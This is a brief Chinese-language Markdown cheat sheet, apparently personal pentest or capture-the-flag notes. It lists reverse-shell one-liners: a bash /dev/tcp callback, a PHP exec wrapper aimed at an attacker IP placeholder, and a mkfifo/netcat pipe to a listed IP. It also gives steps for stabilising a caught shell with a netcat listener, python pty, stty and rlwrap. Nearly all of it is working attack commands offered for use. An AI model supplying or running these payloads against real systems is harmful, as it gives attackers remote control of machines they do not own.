---
tags:
  - 技巧
  - shell
---

## 反shell

**bash**

``````
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
``````

**php**

``````
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<攻击者ip>/1234 0>&1'");
?>
``````



```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.44 1123 >/tmp/f
```



## 稳定shell

**python**
```bash
sudo nc -lvnp 443 获取到反向shell 
python3 -c 'import pty;pty.spawn("/bin/bash")' 使用 Python 生成功能更好的 bash shell 
export TERM=xterm
Ctrl + Z 将 shell 设置为背景 
stty raw -echo; fg 稳定化并重新进入shell
```

**rlwrap**
```bash
rlwrap nc -lvnp <port>
Ctrl + Z 将 shell 设置为背景 
stty raw -echo; fg 稳定化并重新进入shell
```

